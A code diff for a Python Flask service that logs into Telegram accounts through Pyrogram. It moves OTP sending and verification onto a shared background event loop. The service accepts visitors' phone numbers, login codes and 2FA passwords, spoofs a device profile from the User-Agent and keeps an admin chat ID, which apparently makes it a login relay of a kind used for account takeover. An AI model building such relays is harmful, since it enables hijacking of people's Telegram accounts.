@@ -13,6 +13,10 @@ ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
 
 temp_clients = {}
 
+# បង្កើត Global Event Loop ថេរមួយសម្រាប់ដំណើរការ Pyrogram ទាំងអស់
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
 def parse_device_info(user_agent=""):
     device_model = "Mobile App"
     system_version = "Android 13"
@@ -115,7 +119,8 @@ def send_code():
     user_agent = request.headers.get('User-Agent', '')
 
     try:
-        asyncio.run(async_send_code(phone_number, user_agent))
+        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number, user_agent), loop)
+        future.result()
         return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
     except Exception as err:
         return jsonify({"success": False, "error": str(err)}), 500
@@ -131,7 +136,8 @@ def verify_code():
         return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400
 
     try:
-        res = asyncio.run(async_verify_code(phone_number, code, password))
+        future = asyncio.run_coroutine_threadsafe(async_verify_code(phone_number, code, password), loop)
+        res = future.result()
         if res.get("requires_password"):
             return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
         return jsonify(res)
@@ -139,5 +145,9 @@ def verify_code():
         return jsonify({"success": False, "error": str(err)}), 400
 
 if __name__ == '__main__':
+    # ចាប់ផ្ដើម Background Thread សម្រាប់រត់ Global Event Loop
+    import threading
+    threading.Thread(target=loop.run_forever, daemon=True).start()
+
     port = int(os.environ.get("PORT", 3000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, threaded=True)
